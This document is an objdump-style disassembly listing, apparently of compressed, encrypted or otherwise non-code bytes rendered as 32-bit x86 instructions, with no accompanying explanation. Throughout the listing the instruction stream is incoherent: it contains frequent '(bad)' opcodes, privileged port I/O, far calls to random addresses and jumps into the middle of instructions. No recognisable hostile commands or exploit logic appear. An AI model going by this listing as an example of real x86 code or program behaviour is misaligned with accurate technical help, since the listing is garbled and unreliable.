  4368bf:	and    al,0x9a
  4368c1:	mov    ds:0xe3aaeb4f,eax
  4368c6:	sbb    ch,BYTE PTR [edi]
  4368c8:	dec    esi
  4368c9:	cmp    DWORD PTR [eax],ebx
  4368cb:	shl    BYTE PTR [eax+0x5e90b0b0],1
  4368d1:	xor    esp,esp
  4368d3:	jo     0x43686a
  4368d5:	cmc    
  4368d6:	adc    eax,0xafc711f3
  4368db:	mov    ebp,0x4cfd7a9d
  4368e0:	call   0x8d13:0xe5cdf64e
  4368e7:	clc    
  4368e8:	outs   dx,DWORD PTR ds:[esi]
  4368e9:	push   edi
  4368ea:	mov    edi,0xdc238352
  4368ef:	jae    0x436881
  4368f1:	push   cs
  4368f2:	retf   0x7f84
  4368f5:	in     al,dx
  4368f6:	dec    edi
  4368f7:	xchg   esp,eax
  4368f8:	lock mov ds:0x83396e1b,al
  4368fe:	pop    esi
  4368ff:	in     al,dx
  436900:	sbb    DWORD PTR [ecx],ebx
  436902:	xor    ebp,0x969d2b46
  436908:	gs pushf 
  43690a:	imul   edi,DWORD PTR [ebx],0x41
  43690d:	cmp    BYTE PTR [edx-0x4cb653f1],dh
  436913:	ins    DWORD PTR es:[edi],dx
  436914:	stc    
  436915:	iret   
  436916:	mov    ecx,0xe3a6d9a4
  43691b:	inc    esi
  43691c:	vsqrtss xmm4,xmm0,xmm5
  436920:	or     DWORD PTR [edi+0x2cf5d284],ebp
  436926:	in     al,dx
  436927:	test   al,0xcf
  436929:	xchg   edi,eax
  43692a:	out    dx,al
  43692b:	mov    cl,0x5a
  43692d:	aam    0xb3
  43692f:	adc    ah,BYTE PTR fs:[ebx+0x2323275b]
  436936:	fisub  WORD PTR [edi-0x39]
  436939:	mov    dl,0x6
  43693b:	add    esp,esp
  43693d:	cdq    
  43693e:	arpl   WORD PTR [eax+0x47004463],bx
  436944:	test   eax,0xcd189313
  436949:	into   
  43694a:	sub    esp,esp
  43694c:	hlt    
  43694d:	mov    al,ds:0xa4240660
  436952:	pop    edx
  436953:	std    
  436954:	push   ss
  436955:	imul   eax,DWORD PTR [ebp-0x783120e8],0xbbb8c959
  43695f:	add    BYTE PTR [eax-0x1b962f66],dh
  436965:	mov    ebx,eax
  436967:	es dec ebx
  436969:	sar    DWORD PTR [eax-0x458ef871],1
  43696f:	in     al,0x7b
  436971:	add    dh,BYTE PTR [ecx-0x5b]
  436974:	mov    ch,0xb0
  436976:	inc    edx
  436977:	in     eax,dx
  436978:	pop    ds
  436979:	lock and al,BYTE PTR [ecx-0xc31d6dc]
  436980:	mov    dl,0x5f
  436982:	cmp    eax,0x3b9c1a4c
  436987:	cs aaa 
  436989:	fcmovnb st,st(1)
  43698b:	in     al,0x29
  43698d:	mov    ah,0x77
  43698f:	repnz sub BYTE PTR [eax],bh
  436992:	shl    BYTE PTR [edi+ebp*4-0xce0aaaa],0xb6
  43699a:	sti    
  43699b:	adc    dh,ch
  43699d:	xor    ebx,ebx
  43699f:	lock pop ebp
  4369a1:	popa   
  4369a2:	or     ebx,ecx
  4369a4:	fimul  WORD PTR [ebp+0x47]
  4369a7:	push   ss
  4369a8:	cmc    
  4369a9:	mov    ebp,0x26f3f399
  4369ae:	mov    ebx,DWORD PTR [ecx]
  4369b0:	in     eax,0x95
  4369b2:	xchg   esi,eax
  4369b3:	call   0x413b6b0f
  4369b8:	dec    ebx
  4369b9:	sbb    DWORD PTR [eax],edi
  4369bb:	jge    0x43695a
  4369bd:	xor    BYTE PTR [esi+0x30],bh
  4369c0:	pop    ds
  4369c1:	dec    esi
  4369c2:	xor    ecx,ebp
  4369c4:	xchg   ebp,eax
  4369c5:	(bad)  
  4369c6:	jne    0x4369b9
  4369c8:	xchg   esi,eax
  4369c9:	(bad)  
  4369cb:	pop    esi
  4369cc:	and    al,0xc9
  4369ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4369cf:	pop    edx
  4369d0:	jae    0x43699c
  4369d2:	pop    ebp
  4369d3:	inc    ebp
  4369d4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4369d6:	jnp    0x436a36
  4369d8:	int    0xdd
  4369da:	mov    eax,ds:0xf6fe5f9c
  4369df:	add    ebx,DWORD PTR [edx]
  4369e1:	fnstcw WORD PTR [esi-0x2d]
  4369e4:	inc    ecx
  4369e5:	inc    edx
  4369e6:	cdq    
  4369e7:	shr    DWORD PTR [ebx+0x74524c7e],1
  4369ed:	inc    edi
  4369ee:	retf   
  4369ef:	out    0xa0,eax
  4369f1:	inc    edx
  4369f2:	mov    esi,0xc89204c
  4369f7:	lods   al,BYTE PTR ds:[esi]
  4369f8:	sbb    BYTE PTR [edx+esi*8+0x77],al
  4369fc:	out    0x99,eax
  4369fe:	sbb    esp,DWORD PTR [edx+ebx*2-0x21]
  436a02:	xchg   esp,eax
  436a03:	mul    ecx
  436a05:	mov    ch,0xff
  436a07:	gs sahf 
  436a09:	rep lods eax,DWORD PTR ds:[esi]
  436a0b:	stc    
  436a0c:	punpcklbw mm7,DWORD PTR [ecx+0x5bc40484]
  436a13:	push   esp
  436a14:	push   esi
  436a15:	push   0x5a1df527
  436a1a:	popa   
  436a1b:	(bad)  
  436a1c:	push   edi
  436a1d:	mov    ds:0xb3d744b,al
  436a22:	cmp    eax,DWORD PTR [ecx-0x32]
  436a25:	idiv   DWORD PTR [edi-0x23]
  436a28:	inc    ecx
  436a29:	cmp    al,0xc8
  436a2b:	hlt    
  436a2c:	test   DWORD PTR [eax],ebp
  436a2e:	inc    edi
  436a2f:	sub    al,0x6d
  436a31:	out    0xdc,al
  436a33:	repnz outs dx,DWORD PTR ds:[esi]
  436a35:	cdq    
  436a36:	fwait
  436a37:	dec    ecx
  436a38:	call   0xa21b6a39
  436a3d:	inc    esi
  436a3e:	sahf   
  436a3f:	xor    eax,0x94bb4b8b
  436a44:	mov    bl,0x52
  436a46:	int3   
  436a47:	sub    al,0x5
  436a49:	mov    ah,0xd8
  436a4b:	call   0xa7662b5
  436a50:	sbb    eax,0x7b26219
  436a55:	push   edi
  436a56:	mov    al,ds:0x3c7b223e
  436a5b:	(bad)  
  436a5c:	jb     0x436ab5
  436a5e:	ds dec ecx
  436a60:	retf   0xb428
  436a63:	loop   0x436a85
  436a65:	sub    DWORD PTR [ebx],esi
  436a67:	fbstp  TBYTE PTR [ecx+0x4347c27b]
  436a6d:	mov    al,0xdb
  436a6f:	xor    al,0xdc
  436a71:	lds    edx,FWORD PTR [edi+0x4f9f9c06]
  436a77:	xor    ecx,edx
  436a79:	(bad)  
  436a7a:	pushw  ds
  436a7c:	xchg   edx,eax
  436a7d:	data16 sahf 
  436a7f:	mov    ch,0x1d
  436a81:	loope  0x436a3d
  436a83:	stos   DWORD PTR es:[edi],eax
  436a84:	call   0x1583f261
  436a89:	mov    ds:0xde348ecb,eax
  436a8e:	lock ins BYTE PTR es:[edi],dx
  436a90:	mov    ecx,0x4d2878ea
  436a95:	div    BYTE PTR [eax+0x3a80454]
  436a9b:	sub    DWORD PTR ds:0x86ed4123,esp
  436aa1:	loop   0x436ab9
  436aa3:	arpl   WORD PTR [ecx+ebp*8],si
  436aa6:	lds    ebx,FWORD PTR [edx+0xb]
  436aa9:	and    DWORD PTR ds:[eax],esi
  436aac:	pop    ss
  436aad:	mov    dh,0x3
  436aaf:	and    al,0xf7
  436ab1:	cli    
  436ab2:	and    dh,BYTE PTR [ecx-0x11a86c57]
  436ab8:	cli    
  436ab9:	xor    eax,0xb84250e9
  436abe:	mov    ch,0x34
  436ac0:	xchg   ebx,eax
  436ac1:	fild   DWORD PTR ds:0x86a6f5e2
  436ac7:	call   0x9553736b
  436acc:	pop    ss
  436acd:	sub    esp,edi
  436acf:	int3   
  436ad0:	jmp    0x7b4eac16
  436ad5:	call   0xe06f:0xe40e68db
  436adc:	sti    
  436add:	add    eax,0x1e58cdc4
  436ae2:	xor    cl,cl
  436ae4:	add    eax,0x44ef7f5e
  436ae9:	cdq    
  436aea:	push   edx
  436aeb:	fnstenv [ebp-0x76]
  436aee:	xor    ebx,ebp
  436af0:	ins    BYTE PTR es:[edi],dx
  436af1:	xlat   BYTE PTR ds:[ebx]
  436af2:	xchg   DWORD PTR [edx-0x55c506de],edi
  436af8:	push   eax
  436af9:	or     ah,BYTE PTR [edi+0x74]
  436afc:	pop    eax
  436afd:	fwait
  436afe:	stos   DWORD PTR es:[edi],eax
  436aff:	ret    0x5b73
  436b02:	fs into 
  436b04:	and    dl,al
  436b06:	(bad)  
  436b07:	adc    BYTE PTR [ebp+0x3914df14],ch
  436b0d:	adc    esp,esi
  436b0f:	mov    edx,0x83ae6224
  436b14:	and    ebp,DWORD PTR ds:0xc7669313
  436b1a:	retf   0x1856
  436b1d:	pushf  
  436b1e:	or     BYTE PTR [eax],cl
  436b20:	add    eax,0xa3b8d9df
  436b25:	cmp    DWORD PTR [eax-0x1a2ad2ac],0x541a5e5
  436b2f:	repnz ror BYTE PTR [edi+0x3a12aca7],cl
  436b36:	pop    esp
  436b37:	icebp  
  436b38:	jbe    0x436b05
  436b3a:	neg    esi
  436b3c:	jge    0x436b5e
  436b3e:	daa    
  436b3f:	pop    edi
  436b40:	inc    edi
  436b41:	jle    0x436b82
  436b43:	cmp    DWORD PTR [edx],esp
  436b45:	adc    DWORD PTR [ebp+0x7a],ecx
  436b48:	push   es
  436b49:	test   eax,0x7923c1ce
  436b4e:	and    al,0xc0
  436b50:	push   0x34
  436b52:	xor    edi,DWORD PTR [esi]
  436b54:	aas    
  436b55:	and    BYTE PTR [ecx+0x35],dl
  436b58:	sbb    eax,0xac154b79
  436b5d:	pushf  
  436b5e:	in     eax,dx
  436b5f:	jns    0x436b7c
  436b61:	test   eax,0x9eba0343
  436b66:	in     al,0xb4
  436b68:	pop    ebp
  436b69:	inc    edi
  436b6a:	(bad)  
  436b6b:	fcomp  QWORD PTR [eax]
  436b6d:	sar    DWORD PTR [edi+0x73d66a82],1
  436b73:	(bad)  
  436b74:	imul   BYTE PTR [ecx]
  436b76:	dec    edx
  436b77:	popf   
  436b78:	stc    
  436b79:	nop
  436b7a:	cmc    
  436b7b:	cwde   
  436b7c:	and    al,0x60
  436b7e:	sub    BYTE PTR [ecx+0x67],bl
  436b81:	clc    
  436b82:	mov    dl,0xad
  436b84:	in     eax,0x59
  436b86:	cmp    al,0xf4
  436b88:	sub    bh,BYTE PTR [ecx+ebx*8+0x23]
  436b8c:	sbb    ecx,ebp
  436b8e:	test   eax,0x469ebacc
  436b93:	add    ecx,edi
  436b95:	xlat   BYTE PTR ds:[ebx]
  436b96:	fwait
  436b97:	daa    
  436b98:	and    dl,BYTE PTR [edi+0x659b5e2c]
  436b9e:	mov    al,ds:0x839ae051
  436ba3:	push   edi
  436ba4:	sbb    al,0x75
  436ba6:	out    dx,eax
  436ba7:	jno    0x436b4a
  436ba9:	add    al,BYTE PTR [edi+esi*4+0x6]
  436bad:	scas   al,BYTE PTR es:[edi]
  436bae:	test   al,0x63
  436bb0:	sbb    DWORD PTR [eax+0x59b23acd],ebp
  436bb6:	rcl    esi,0xd1
  436bb9:	je     0x436bb8
  436bbb:	jno    0x436bd6
  436bbd:	cmp    DWORD PTR [ecx-0x4],0xe9dd1f5b
  436bc4:	out    0x1,eax
  436bc6:	cld    
  436bc7:	xlat   BYTE PTR ds:[ebx]
  436bc8:	shl    DWORD PTR [eax+0x765e5d5],0x7b
  436bcf:	push   cs
  436bd0:	in     al,dx
  436bd1:	jge    0x436be8
  436bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436bd4:	jne    0x436bc5
  436bd6:	xchg   edx,eax
  436bd7:	call   0x384191c8
  436bdc:	(bad)  
  436bdd:	mov    ebx,esi
  436bdf:	retf   0x1720
  436be2:	xchg   edx,eax
  436be3:	mov    al,0xe7
  436be5:	ror    edi,cl
  436be7:	loop   0x436c62
  436be9:	mov    ebp,0x255c94b6
  436bee:	test   cl,0x9a
  436bf1:	out    0xd4,al
  436bf3:	lods   eax,DWORD PTR ds:[esi]
  436bf4:	xor    DWORD PTR [ebx],ebp
  436bf6:	mov    edi,0xf8a72ad4
  436bfb:	mov    ch,0x83
  436bfd:	jle    0x436c43
  436bff:	inc    ebp
  436c00:	push   cs
  436c01:	mov    bh,0x47
  436c03:	fist   DWORD PTR [edx+0x25391b7f]
  436c09:	fwait
  436c0a:	mov    ebx,0x91c31e8b
  436c0f:	jg     0x80af2cef
  436c15:	clc    
  436c16:	mov    cl,0xd4
  436c18:	mov    edx,0x965d264c
  436c1d:	loope  0x436c98
  436c1f:	or     BYTE PTR [ebp+0x17c170fc],bl
  436c25:	adc    eax,0xcd0ca8e7
  436c2a:	retf   
  436c2b:	xor    al,0xa6
  436c2d:	sub    eax,0x21223d4c
  436c32:	icebp  
  436c33:	sbb    edi,esp
  436c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436c36:	jmp    0x436c32
  436c38:	xchg   DWORD PTR [eax-0x2674c8e7],esp
  436c3e:	mov    ah,0xe8
  436c40:	sbb    BYTE PTR [ecx+0x3a],ch
  436c43:	mov    ah,0x49
  436c45:	pop    ds
  436c46:	sahf   
  436c47:	mov    eax,0x2f7ba574
  436c4c:	or     eax,0x4219d8cc
  436c51:	jns    0x436c1d
  436c53:	mov    edi,0xb4bc3506
  436c58:	adc    DWORD PTR [eax-0x18],esp
  436c5b:	inc    BYTE PTR [esi+0x3205944]
  436c61:	sbb    ebx,eax
  436c63:	mov    dl,0x8d
  436c65:	adc    eax,0x42e153be
  436c6a:	jmp    0x66b:0x4cc88f30
  436c71:	into   
  436c72:	lds    ebx,FWORD PTR [esi]
  436c74:	mov    ch,0x42
  436c76:	mov    ebp,0x8f32c172
  436c7b:	in     eax,dx
  436c7c:	sbb    al,0x89
  436c7e:	xchg   esi,eax
  436c7f:	lahf   
  436c80:	jno    0x436ce1
  436c82:	pushf  
  436c83:	and    eax,0x52ac0956
  436c88:	ror    DWORD PTR [edx-0x39],1
  436c8b:	cmp    dl,ch
  436c8d:	and    eax,DWORD PTR [ebp+0x1b]
  436c90:	jne    0x436cef
  436c92:	sub    eax,0xe6a91af3
  436c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436c98:	mov    DWORD PTR [ebx+ecx*1],edx
  436c9b:	popf   
  436c9c:	push   DWORD PTR [ebx-0x1d31f7a5]
  436ca2:	sbb    al,dl
  436ca4:	add    bl,al
  436ca6:	idiv   DWORD PTR [esi+ebx*1-0x3c]
  436caa:	in     eax,dx
  436cab:	ins    DWORD PTR es:[edi],dx
  436cac:	sbb    bh,cl
  436cae:	inc    edx
  436caf:	(bad)  
  436cb0:	jb     0x436c8d
  436cb2:	shr    BYTE PTR [ebx],cl
  436cb4:	and    eax,0xdb77de1c
  436cb9:	mov    eax,ds:0x201440db
  436cbe:	nop
  436cbf:	inc    esi
  436cc0:	mov    edx,0xbb0925b7
  436cc5:	add    eax,0xc457c4b4
  436cca:	jnp    0x436cfb
  436ccc:	xchg   al,ch
  436cce:	(bad)  
  436ccf:	cmp    esp,ecx
  436cd1:	lahf   
  436cd2:	inc    edi
  436cd3:	ds in  al,dx
  436cd5:	inc    eax
  436cd6:	add    DWORD PTR [ebp-0xb],ecx
  436cd9:	mov    bh,0xb3
  436cdb:	mov    ah,0xed
  436cdd:	(bad)  
  436cdf:	push   cs
  436ce0:	adc    eax,0x3ee2f7e
  436ce5:	mov    edi,0xece7447e
  436cea:	ja     0x436d2e
  436cec:	std    
  436ced:	and    DWORD PTR [edi+ebp*8+0x49ad1f80],esp
  436cf4:	mul    BYTE PTR [ebx+0x50]
  436cf7:	loope  0x436d17
  436cf9:	out    dx,eax
  436cfa:	cmc    
  436cfb:	mov    esi,0xd1718479
  436d00:	or     eax,0xbd45962c
  436d05:	dec    eax
  436d06:	or     ah,dh
  436d08:	mov    al,ds:0x1885bf27
  436d0d:	xor    DWORD PTR [edx+eiz*2-0x64],esp
  436d11:	lahf   
  436d12:	and    DWORD PTR [ecx+0x66cb4923],ebx
  436d18:	sbb    eax,0xee33d632
  436d1d:	mov    cl,BYTE PTR ds:0x57a367a5
  436d23:	pop    eax
  436d24:	rcr    BYTE PTR [edi+0x91b0086],cl
  436d2a:	cmp    al,0xca
  436d2c:	out    0x60,eax
  436d2e:	popa   
  436d2f:	icebp  
  436d30:	adc    bl,BYTE PTR [ebp+0x2f7ca56b]
  436d36:	out    dx,eax
  436d37:	std    
  436d38:	sbb    eax,0xdb395dc6
  436d3d:	mov    bh,al
  436d3f:	xor    al,0x5e
  436d41:	ja     0x3be2023e
  436d47:	mov    eax,ds:0x881542b1
  436d4c:	push   cs
  436d4d:	pop    edx
  436d4e:	push   eax
  436d4f:	je     0x436d61
  436d51:	fdivr  QWORD PTR [ebx+0x72d01be4]
  436d57:	sub    edx,DWORD PTR [ebp-0xb167f36]
  436d5d:	jle    0x436d0f
  436d5f:	in     al,dx
  436d60:	sbb    eax,0xbcbc43b9
  436d65:	jge    0x436cf5
  436d67:	adc    bh,BYTE PTR [ecx+eiz*4-0x5e8eb8e5]
  436d6e:	dec    ecx
  436d6f:	gs dec ebx
  436d71:	fdivr  QWORD PTR [esi]
  436d73:	(bad)  
  436d74:	stos   BYTE PTR es:[edi],al
  436d75:	fwait
  436d76:	cmp    ebx,DWORD PTR [eax+0x74]
  436d79:	push   ebp
  436d7a:	cmp    ebx,DWORD PTR [ebp+0x48]
  436d7d:	sahf   
  436d7e:	jnp    0x436d4b
  436d80:	lea    edi,[esp]
  436d83:	or     eax,0xe1f5e510
  436d88:	xchg   esp,eax
  436d89:	std    
  436d8a:	jge    0x436db3
  436d8c:	push   0x2b24be27
  436d91:	cdq    
  436d92:	(bad)  [eax-0x17b6dd04]
  436d98:	inc    edi
  436d99:	aas    
  436d9a:	fidivr DWORD PTR [ecx]
  436d9c:	dec    ebx
  436d9d:	retf   0x54b7
  436da0:	dec    edi
  436da1:	mov    BYTE PTR [edx],bh
  436da3:	cmp    esi,DWORD PTR [esi]
  436da5:	mov    DWORD PTR [edi],ebp
  436da7:	sub    BYTE PTR [ecx-0x3756dc58],bl
  436dad:	call   ebx
  436daf:	inc    ebp
  436db0:	cmp    al,BYTE PTR [ebx-0x1a]
  436db3:	add    al,0xbd
  436db5:	es cdq 
  436db7:	call   0xa31f0bc9
  436dbc:	aas    
  436dbd:	push   0x7b
  436dbf:	retf   0x474
  436dc2:	shl    DWORD PTR [ecx+esi*8-0x33],cl
  436dc6:	mov    dl,0x4
  436dc8:	ficom  WORD PTR [ecx+0x39]
  436dcb:	pop    ebx
  436dcc:	push   ebp
  436dcd:	int3   
  436dce:	pop    esp
  436dcf:	lock scas al,BYTE PTR es:[edi]
  436dd1:	xor    dh,BYTE PTR [eax-0x7]
  436dd4:	sub    edi,DWORD PTR [ecx-0x7cafc97f]
  436dda:	imul   esi,DWORD PTR [ebx],0x610b66df
  436de0:	gs pusha 
  436de2:	add    bh,ch
  436de4:	pusha  
  436de5:	xor    eax,0xb543d00f
  436dea:	jmp    0x436dad
  436dec:	push   edi
  436ded:	adc    eax,0x9c75afd4
  436df2:	or     ebp,esp
  436df4:	or     BYTE PTR [esi-0x1],dh
  436df7:	icebp  
  436df8:	pop    ss
  436df9:	sub    DWORD PTR [edx+ebx*8+0x79],ecx
  436dfd:	repnz fcomp QWORD PTR [ecx+0x20dba68b]
  436e04:	(bad)  
  436e06:	xchg   ecx,eax
  436e07:	mov    cl,0x77
  436e09:	in     al,0x5d
  436e0b:	mov    eax,0x14b65fcf
  436e10:	and    DWORD PTR [esi+ecx*1+0x6e],edx
  436e14:	aad    0xc5
  436e16:	inc    esp
  436e17:	repz or DWORD PTR [ecx+0x5922a710],0x54fd7730
  436e22:	or     DWORD PTR [ecx+0x5e3573e],ecx
  436e28:	xchg   ebp,eax
  436e29:	mov    fs,esp
  436e2b:	lock mov esp,0x1c90befb
  436e31:	sbb    DWORD PTR [edi-0x53],ebx
  436e34:	adc    dh,BYTE PTR [esi]
  436e36:	shr    BYTE PTR [esi+0x22],0x7b
  436e3a:	jmp    0x1e5b:0x3fe616ff
  436e41:	lahf   
  436e42:	ss aad 0x4d
  436e45:	(bad)  
  436e46:	repnz cmp al,0x32
  436e49:	loope  0x436e01
  436e4b:	test   BYTE PTR [ebp+0xc],ah
  436e4e:	inc    ecx
  436e4f:	scas   eax,DWORD PTR es:[edi]
  436e50:	push   es
  436e51:	test   DWORD PTR [ebp+0x64],edx
  436e54:	out    0xa6,eax
  436e56:	mov    edx,?
  436e58:	and    DWORD PTR [edi+ecx*1],0xffffffcd
  436e5c:	dec    ebp
  436e5d:	add    DWORD PTR [eax*1+0x412e9024],ebp
  436e64:	mov    eax,0x990eae59
  436e69:	mov    BYTE PTR [ebp+eiz*4-0x776a7edb],cl
  436e70:	add    al,0x29
  436e72:	(bad)  
  436e74:	call   0xd2aa:0x7154b3f7
  436e7b:	pop    ebp
  436e7c:	in     eax,0xa6
  436e7e:	shl    edx,0xa3
  436e81:	and    edi,ebx
  436e83:	pop    eax
  436e84:	sbb    cl,cl
  436e86:	adc    BYTE PTR [esi],dl
  436e88:	dec    ebx
  436e89:	fadd   QWORD PTR ds:0xb9a5003
  436e8f:	not    BYTE PTR [eax-0x29]
  436e92:	adc    eax,DWORD PTR [ecx-0x71]
  436e95:	xchg   ebx,eax
  436e96:	pushf  
  436e97:	rol    BYTE PTR [ebp+eax*2-0x4b],1
  436e9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436e9c:	dec    ebx
  436e9d:	scas   eax,DWORD PTR es:[edi]
  436e9e:	cmp    bh,cl
  436ea0:	in     eax,0xa0
  436ea2:	(bad)  
  436ea3:	stc    
  436ea4:	mov    ch,0x54
  436ea6:	mov    dl,BYTE PTR [ebx+0x2fa68262]
  436eac:	xchg   DWORD PTR [eax+0x5a8a2523],edi
  436eb2:	aad    0xbc
  436eb4:	inc    esp
  436eb5:	dec    ecx
  436eb6:	mov    ah,0x7
  436eb8:	push   ebp
  436eb9:	sub    DWORD PTR [edi-0x5e99260c],ebp
  436ebf:	(bad)  
  436ec0:	scas   al,BYTE PTR es:[edi]
  436ec1:	imul   eax,DWORD PTR ds:0x3417de6b,0x8d391a46
  436ecb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436ecc:	imul   esp,DWORD PTR [eax-0x5a3e02b5],0xffffffb0
  436ed3:	cli    
  436ed4:	fsubr  QWORD PTR [edx+0x7d]
  436ed7:	shr    edx,0x4
  436eda:	mov    ebp,0x52286b84
  436edf:	xor    esi,ebp
  436ee1:	xor    cl,dh
  436ee3:	out    dx,eax
  436ee4:	and    BYTE PTR [eax+0x5925ae25],ah
  436eea:	jb     0x436ec4
  436eec:	outs   dx,BYTE PTR ds:[esi]
  436eed:	test   ebx,ebp
  436eef:	dec    esi
  436ef0:	jg     0x436f4b
  436ef2:	stos   BYTE PTR es:[edi],al
  436ef3:	stc    
  436ef4:	(bad)
  436ef7:	jmp    0x436f61
  436ef9:	ins    DWORD PTR es:[edi],dx
  436efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436efb:	sbb    BYTE PTR [esi],ah
  436efd:	cmp    DWORD PTR ds:0x1f6225ef,ebp
  436f03:	inc    esi
  436f04:	push   esi
  436f05:	daa    
  436f06:	ror    DWORD PTR [esi+eiz*1+0x48366c1b],cl
  436f0d:	call   0x5437:0x253ddf97
  436f14:	arpl   WORD PTR [esi-0x47],bp
  436f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436f18:	pop    eax
  436f19:	push   edi
  436f1a:	arpl   WORD PTR [esi-0x133baeeb],di
  436f20:	cld    
  436f21:	addr16 inc eax
  436f23:	sbb    DWORD PTR [ecx],0x39
  436f26:	shl    DWORD PTR [ebx],0x11
  436f29:	adc    al,0x7a
  436f2b:	nop
  436f2c:	add    DWORD PTR [edi-0x4],edx
  436f2f:	mov    ecx,0x9ba4a34c
  436f34:	dec    edx
  436f35:	dec    esi
  436f36:	mov    ebp,0xf859225c
  436f3b:	rcl    BYTE PTR [edi+0x4b081022],1
  436f41:	rol    edx,1
  436f43:	push   es
  436f44:	(bad)  
  436f45:	leave  
  436f46:	push   es
  436f47:	lods   al,BYTE PTR ds:[esi]
  436f48:	inc    ebp
  436f49:	out    0x22,al
  436f4b:	icebp  
  436f4c:	imul   ebx,DWORD PTR [ebx],0x683d2dda
  436f52:	and    al,BYTE PTR ds:0x606bd11d
  436f58:	pop    ebx
  436f59:	lahf   
  436f5a:	jnp    0x436eec
  436f5c:	call   0xe9aa04f0
  436f61:	add    al,0x64
  436f63:	leave  
  436f64:	and    eax,0x367fb069
  436f69:	and    al,0x4f
  436f6b:	dec    ebx
  436f6c:	cwde   
  436f6d:	sbb    ecx,edx
  436f6f:	rcr    BYTE PTR ds:0xd5bcba09,1
  436f75:	sbb    DWORD PTR [ecx+ebp*1+0x76],0xffffff99
  436f7a:	int3   
  436f7b:	cmp    eax,DWORD PTR [ecx+0x7919c094]
  436f81:	aas    
  436f82:	aad    0xd6
  436f84:	and    bh,BYTE PTR [esp-0x53]
  436f88:	jb     0x436f7d
  436f8a:	aas    
  436f8b:	jmp    0x6891d8bc
  436f90:	or     al,0xb7
  436f92:	push   cs
  436f93:	pusha  
  436f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436f95:	xlat   BYTE PTR ds:[ebx]
  436f96:	jae    0x436f38
  436f98:	xchg   ebp,eax
  436f99:	aam    0xf
  436f9b:	cli    
  436f9c:	pop    es
  436f9d:	fbstp  TBYTE PTR [esi-0x7a]
  436fa0:	inc    ebx
  436fa1:	in     eax,0x14
  436fa3:	mov    dh,BYTE PTR [eax]
  436fa5:	adc    DWORD PTR [edx-0x76530683],edx
  436fab:	ret    0x8452
  436fae:	enter  0x3057,0xab
  436fb2:	cmp    DWORD PTR [ebx+0x2d],edx
  436fb5:	mov    edi,0x4ac2f4b3
  436fba:	cmp    BYTE PTR [edi-0x2b],ch
  436fbd:	repz (bad) 
  436fc0:	xchg   edi,eax
  436fc1:	(bad)  
  436fc3:	fcomp  DWORD PTR ds:0xe2cbb1e9
  436fc9:	lahf   
  436fca:	push   ebp
  436fcb:	mov    dl,ah
  436fcd:	cdq    
  436fce:	or     eax,DWORD PTR [ecx+0x3af52588]
  436fd4:	cld    
  436fd5:	int    0x6d
  436fd7:	mov    eax,0xd84ba074
  436fdc:	call   0xd0907d7d
  436fe1:	pop    ebx
  436fe2:	sbb    eax,0x4785cd23
  436fe7:	addr16 aam 0x2c
  436fea:	mov    dl,0x7c
  436fec:	cmp    BYTE PTR [ebp-0x75],dl
  436fef:	scas   eax,DWORD PTR es:[edi]
  436ff0:	or     ah,al
  436ff2:	xchg   ecx,eax
  436ff3:	and    eax,0xf208d7e5
  436ff8:	mov    edx,0xc746ad81
  436ffd:	aaa    
  436ffe:	and    al,0xa2
  437000:	pop    ds
  437001:	pop    ecx
  437002:	dec    ebx
  437003:	ret    
  437004:	jo     0x436fc6
  437006:	in     eax,0xa3
  437008:	(bad)  
  437009:	imul   edi,DWORD PTR [eax-0x5b57dc0c],0xc8f935ad
  437013:	out    0x24,al
  437015:	cmc    
  437016:	and    eax,0xa550df4c
  43701b:	je     0x437082
  43701d:	xlat   BYTE PTR ds:[ebx]
  43701e:	mov    dl,0xf4
  437020:	fistp  DWORD PTR [ebp-0x74eaceec]
  437026:	xor    ch,ch
  437028:	inc    edi
  437029:	adc    al,0x63
  43702b:	retf   0xe916
  43702e:	js     0x437001
  437030:	in     eax,dx
  437031:	add    DWORD PTR [esi],eax
  437033:	in     al,0xf4
  437035:	mov    ds:0xcfae41db,al
  43703a:	fdivr  QWORD PTR [ecx-0x28]
  43703d:	enter  0x9052,0x71
  437041:	mov    BYTE PTR [edx-0x2b],ah
  437044:	mul    BYTE PTR [ecx+0x1aa2e23f]
  43704a:	(bad)  
  43704b:	out    0xe5,eax
  43704d:	fisttp QWORD PTR [esi-0xd]
  437050:	(bad)  
  437051:	jo     0x437031
  437053:	fcmovb st,st(1)
  437055:	sbb    BYTE PTR [ebx+0x1f],0x40
  437059:	jns    0x437017
  43705b:	or     eax,0xeb24438e
  437060:	xor    DWORD PTR [ebx-0x5d],eax
  437063:	out    dx,al
  437064:	xor    eax,0x8aeda57c
  437069:	add    al,cl
  43706b:	daa    
  43706c:	xor    al,0xc9
  43706e:	pop    ebx
  43706f:	fimul  WORD PTR [edi+0x56]
  437072:	test   edi,ebp
  437074:	fisub  WORD PTR [edi-0x59]
  437077:	call   0x8200:0xeb296375
  43707e:	lods   al,BYTE PTR ds:[esi]
  43707f:	hlt    
  437080:	test   eax,ecx
  437082:	call   0xb48737e5
  437087:	in     al,0x85
  437089:	div    DWORD PTR [edx]
  43708b:	test   DWORD PTR [esi+0x48],0x9a76e49e
  437092:	pop    ebx
  437093:	dec    ecx
  437094:	jle    0x437047
  437096:	mov    esp,0xb8592001
  43709b:	into   
  43709c:	repnz hlt 
  43709e:	inc    eax
  43709f:	add    esp,esp
  4370a1:	(bad)  
  4370a2:	das    
  4370a3:	sti    
  4370a4:	inc    edi
  4370a5:	jns    0x43707a
  4370a7:	push   ebx
  4370a8:	dec    ecx
  4370a9:	xor    al,0x4b
  4370ab:	xchg   DWORD PTR [edi-0x58],edx
  4370ae:	mov    edi,0x46604a44
  4370b3:	sbb    ebp,eax
  4370b5:	mov    dl,0xb5
  4370b7:	and    eax,0xeb6820a5
  4370bc:	push   ds
  4370bd:	lock cmp BYTE PTR [edi-0x4b471e7d],al
  4370c4:	in     eax,dx
  4370c5:	mov    esi,0xee65b607
  4370ca:	mov    ebx,0xea3b66ed
  4370cf:	add    DWORD PTR [eax+0x1c7cc537],0xacd312c9
